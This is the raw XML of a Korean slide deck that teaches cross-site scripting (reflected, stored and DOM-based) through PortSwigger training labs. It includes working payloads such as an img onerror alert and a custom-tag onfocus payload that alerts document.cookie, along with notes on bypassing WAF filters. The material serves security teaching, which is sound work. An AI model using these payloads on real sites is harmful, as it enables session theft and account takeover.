            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cross-site scripting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2B8811-A87E-4EDC-AFFC-CD9BDC8F01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(lab-html-context-nothing-encoded)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 실행시켜 보아요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https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded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871FDF-C497-4699-86EF-3AEFC8AB0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8281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A531DF-9281-4975-82CA-FA6AC39BE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XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cheat sheet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AA6B72-46E8-4142-B2BC-9F19DD5EFF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https://portswigger.net/web-security/cross-site-scripting/cheat-sheet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앞선 실습에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;script&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>태그를 제한한다면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en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 공격은 매우 많은 필터링과 우회 방안이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태그를 화이트리스트로 관리하기도</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>블랙리스트로 관리하기도 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ADD5C6-9623-4F0E-8133-3643E848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5884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9BC213-33AF-4F23-BF83-9412F65EB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XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cheat sheet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51B82F-6A7C-4372-A688-4FE18AAF1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HTML event?</a:t>
            </a:r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이벤트를 통해 스크립트를 작동시킬 수 있음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815137-DC69-460B-BA78-7B762ABB1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17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D096B03-230F-4A66-8904-C3BA1DD8F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766" y="2673829"/>
            <a:ext cx="5790467" cy="3227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20811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4E5AC-0BBF-4EA7-8DDD-3655334C3C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XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cheat sheet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DDD9B8-978E-42ED-905E-B318FD9C3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en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>=x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>=“alert(1)”&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>상황에 맞게 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cheat sheet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 활용하여 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>할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굉장히 유용하게 쓰임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260E4A9-4C4B-4596-A181-C19CCA498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6308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38E412-4AC7-4235-BC7D-89F5C237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7FF399-1F75-4EE9-BA85-D8CCE1D18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WAF?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>웹 방화벽 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(Web Application Firewall)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS, SQL Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>과 같은 웹 공격을 탐지하고 차단하는 장비</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격 패턴을 파악 및 방어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884C24-BE87-43A7-A3D4-883931F6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19</a:t>
            </a:fld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7983C60-83B4-4E2B-865A-E5B743A91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1054" y="2142769"/>
            <a:ext cx="3143689" cy="3353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8367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16B172-8B0B-42C4-9B3C-D5D14A680A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WAF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FC1C48-9229-4F43-90AD-44DDD554B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단순한 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>는 쉽게 막힌다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대부분의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>tag</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>와 속성 이벤트는 차단된다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5B4DF4-CE09-438E-BCBE-85E9BB25B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09974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CCA483-5152-4C67-9429-8C6D8921A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Reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cross-site scripting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AC7F29-2C22-422B-AD30-807870645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(most tags and attributes blocked)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 우회하고 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>alert </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>시키기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대부분의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>tag</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>와 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>attribute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>가 막혀 있으니</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>허용되는 것을 찾아야함</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>!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Python</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 이용해서 코드를 짜봅시다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https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked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B0211C-2768-42CA-BE3F-B33014714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69110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94B35F-CCDB-46B5-8E0E-6F4A43E34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Reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cross-site scripting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134EE90-6F76-48E6-8B11-A9F807A4A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https://pastebin.com/rEWHZyVg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189946-83A1-4CFC-A0A6-A3DD3AFF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22</a:t>
            </a:fld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FC7012-5604-416C-AE45-D36D44F63E82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1405666" y="2524900"/>
            <a:ext cx="90086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81295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65DBE-4571-4D05-85B7-E75C3C395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Reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cross-site scripting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25827C-DE84-4594-B445-12F2F0EAE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(all tags blocked except custom ones)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>모든 태그가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>막혀있다면</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>..?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>custom tag</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 이용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document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>alert </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>시켜 보아요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https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked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A85F2A-89D6-45B7-BAF1-440EA51C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116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A23CF9-853A-4086-ACBA-B45F06E72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Reflected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>cross-site scripting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E686C9-2DFC-4238-A0CA-B6E26F722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effectLst/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://ac771f6b1fae782a80400d44008a0088.web-security-academy.net/?search=&lt;asdf id=x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:effectLst/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>onfocus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:effectLst/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>=alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:effectLst/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:effectLst/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:effectLst/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>tabindex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:effectLst/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>=1&gt;#x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7FF4E2-A936-4DA9-A0A1-4A2A61221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54806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6EC428-4697-46ED-BD6D-7F94F2C82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Impact of Reflected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44387A-3714-4506-92E8-4D52B8EE1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공격 성공</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>사용자가 수행할 수 있는 모든 작업을 공격자가 수행할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사용자가 볼 수 있는 모든 정보를 볼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사용자가 수정할 수 있는 정보를 수정할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계정 탈취 이외의 악의적인 스크립트 실행가능</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>. (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>피싱 사이트</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>유도</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>다른 사이트 이동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이후 언급하겠지만</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>httponly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>옵션에 의해 사용자의 권한을 얻지 못할 수도 있음</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>또한</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>사용자 권한이 없어도 실행되는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>xss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>일 수도 있음</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>.)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880E9B-CCA7-4A2E-9FD2-300BD495E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268030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C9283E-4FB8-4C0B-9FBA-A73AD1662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Impact of Reflected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1173DDB-9A37-493F-B818-04B1CEA67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Reflected XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격을 제공하는 방법</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>다른</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>웹 사이트에  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>링크를 배치하거나</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이메일</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>트위터 등등으로 링크를 전송하여 유도</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>특정 사용자를 대상으로 하거나</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>사용자를 무차별적으로 공격할 수도 있음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Stored XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>취약점 보다는 덜 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>critical </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>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Reflected XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>는 웹 사이트 외부에서 유도하는 기술이 필요함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Stored XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>는 웹 사이트 내부에서 자체적인 공격을 수행할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1D5B343-EDD8-4797-8FE6-05A04CC93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52858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C40CFE-C54B-4EE3-A64D-29C935158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Stored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48EE3D-6A84-4D2D-877A-CC37847BDF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웹 애플리케이션 취약점이 있는 웹 서버에 악성 스크립트를 영구적으로 저장해 놓는 방법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1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>웹 사이트의 게시판</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>사용자 프로필 및 코멘트 필드 등에 악성 스크립트를 삽입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사용자가 사이트를 방문하여 저장되어 있는 페이지에 정보를 요청하게 되고 서버는 악성 스크립트를 사용자에게 전달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사용자 브라우저에서 스크립트가 실행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C52CED-F285-4975-A652-8D4A28F2D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31895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46C50-977E-46B5-983B-E4ED82678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Stored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58D9A6-AD2B-44C5-BF8C-2B0C55A92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블로그에 답글을 달 수 있는 기능이 있다고 생각해보자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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>가 제출된 후</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>웹 사이트 방문자는 다음과 같은 응답을 받음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C240F9A-ADD8-4057-B12F-65CB9BE7D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8B65992-7DC9-46E4-A264-E08B58776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9882" y="2254385"/>
            <a:ext cx="10215155" cy="21098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8B2EEE-0A06-48AF-83D2-CA2464A2B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9882" y="4970617"/>
            <a:ext cx="5725324" cy="46679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액자 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{579009B3-E5D7-4DAD-A347-C59E08B3F1E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3550920" y="3657600"/>
            <a:ext cx="4282440" cy="304800"/>
          </a:xfrm>
          <a:prstGeom prst="fram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91655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3095D8-C373-4F64-AD31-F9E6B82C8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Stored XSS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521BB2-BF89-4A5B-B247-A1660B53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29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3B8821E-9E40-479E-9728-1280C85BFD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25" y="2413511"/>
            <a:ext cx="10088383" cy="5048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1F426C80-AC80-4F4A-B126-1AAAE0BD6B21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="1893125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342900" indent="-342900" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" latinLnBrk="1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3"/>
              </a:buClr>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2000" b="0" kern="1200"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+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="38404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+mn-cs"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="56692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+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="74980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+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="932688" indent="-18288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a고딕12" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
                <a:ea typeface="a고딕12" panose="02020600000000000000" pitchFamily="18" charset="-127"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="11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1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3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다음과 같이 공격할 수 있음</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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12E3E64-1811-47DE-84A9-E60AC2E840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3190842"/>
            <a:ext cx="6849431" cy="47631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159888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0D396A-B656-420D-B6E6-BE6E03C9D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Stored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A62D2E-1A98-4FD6-940B-E7A482C9A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(lab-html-context-nothing-encoded)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded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F4C110-8CEA-4115-85E2-6D35DE6D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58866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09910C-78CE-4A18-A167-1186267A7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Stored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91D6F9-C2C1-429E-8E3F-44830FE4F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(lab-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-attribute-double-quotes-html-encoded)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded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D2FF32-1D60-4BCD-A35B-7DB8F4428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692766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4590D2-7869-490D-9B3E-5DB3930B0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DOM-based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DF1F57-402C-478E-A741-B6B9731E4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DOM(Document Object Model)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이란 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>W3C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>표준으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>및 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문서에 접근방법을 표준으로 정의하는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>문서객체모델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DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문서를 계층적으로 보면서 컨텐츠를 동적으로 변경할 수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AF9DF94-5AF6-44A2-8656-BF37A4896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08738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35EBCC-E590-4068-A322-CE46B87A2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DOM-based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E9EE2E-73BA-4920-B3DA-94F7332C4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DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>기반 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>2005</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>년에 처음으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
              <a:t>아밋</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 클라인</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(Amit Klein)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이 관련 취약점 논문을 발표하면서 알려짐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피해자의 브라우저가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>페이지를 구문 분석할 때마다 공격 스크립트가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>생성의 일부로 실행되면서 공격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페이지 자체는 변하지 않으나</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>페이지에 포함되어 있는 브라우저측 코드가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>환경에서 악성코드로 실행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61781A-920C-4636-B42C-8C7A37456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34577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451352-0B93-4E77-A35B-4455666A1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DOM-based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1DC105-EC86-49A1-9F71-3470CDB459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Stored XSS, Reflected XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>는 악성 페이로드가 서버 측 취약점으로 인해</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>응답 페이지에 악성 스크립트가 포함되어 전달되는 것과 다르게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en-US" altLang="ko-KR" dirty="0"/>
